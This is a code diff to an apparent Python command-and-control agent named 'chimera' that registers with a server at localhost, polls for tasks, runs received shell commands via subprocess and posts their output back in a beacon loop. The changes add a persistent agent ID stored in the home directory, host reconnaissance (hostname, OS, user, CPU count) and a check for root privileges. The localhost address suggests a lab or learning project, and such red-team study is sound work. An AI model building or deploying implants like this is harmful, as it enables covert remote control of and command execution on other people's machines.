@@ -1,4 +1,6 @@
 import getpass
+import json
+import os
 import platform
 import random
 import subprocess
@@ -7,17 +9,55 @@ import uuid
 
 import requests
 
+
 SERVER_URL = "http://127.0.0.1:8000"
-AGENT_ID = str(uuid.uuid4())[:8]
+
+# Keep the agent identity stable across restarts.
+AGENT_ID_FILE = os.path.expanduser("~/.chimera_agent_id")
+
+
+def get_agent_id():
+    try:
+        if os.path.exists(AGENT_ID_FILE):
+            with open(AGENT_ID_FILE, "r", encoding="utf-8") as file:
+                agent_id = file.read().strip()
+
+            if agent_id:
+                return agent_id
+
+        agent_id = str(uuid.uuid4())[:8]
+
+        with open(AGENT_ID_FILE, "w", encoding="utf-8") as file:
+            file.write(agent_id)
+
+        return agent_id
+
+    except OSError as exc:
+        print(f"[-] Could not persist agent ID: {exc}")
+        return str(uuid.uuid4())[:8]
+
+
+AGENT_ID = get_agent_id()
+
+
+def get_system_info():
+    return {
+        "hostname": platform.node(),
+        "os": platform.system(),
+        "os_release": platform.release(),
+        "user": getpass.getuser(),
+        "ip": "127.0.0.1",
+        "cpu_cores": os.cpu_count() or 1,
+    }
 
 
 def register():
+    system_info = get_system_info()
+
     payload = {
         "agent_id": AGENT_ID,
-        "hostname": platform.node(),
-        "os": platform.system(),
-        "user": getpass.getuser(),
-        "ip": "127.0.0.1",
+        **system_info,
+        "is_privileged": os.geteuid() == 0 if hasattr(os, "geteuid") else False,
     }
 
     try:
@@ -26,9 +66,16 @@ def register():
             json=payload,
             timeout=5,
         )
+
         response.raise_for_status()
 
         print(f"[+] Registered Agent ID: {AGENT_ID}")
+        print(
+            f"[*] Host: {system_info['hostname']} | "
+            f"OS: {system_info['os']} {system_info['os_release']} | "
+            f"User: {system_info['user']}"
+        )
+
         return response.json()
 
     except requests.exceptions.RequestException as exc:
@@ -47,6 +94,7 @@ def execute_command(command: str):
         )
 
         output = process.stdout if process.stdout else process.stderr
+
         return output, process.returncode
 
     except subprocess.TimeoutExpired:
@@ -64,6 +112,7 @@ def poll_once():
     )
 
     response.raise_for_status()
+
     return response.json().get("task")
 
 
@@ -109,6 +158,7 @@ def beacon_loop():
                     )
 
                     print(f"[+] Posted results for Task [{task_id}]")
+
             else:
                 print("[*] No task available.")
 
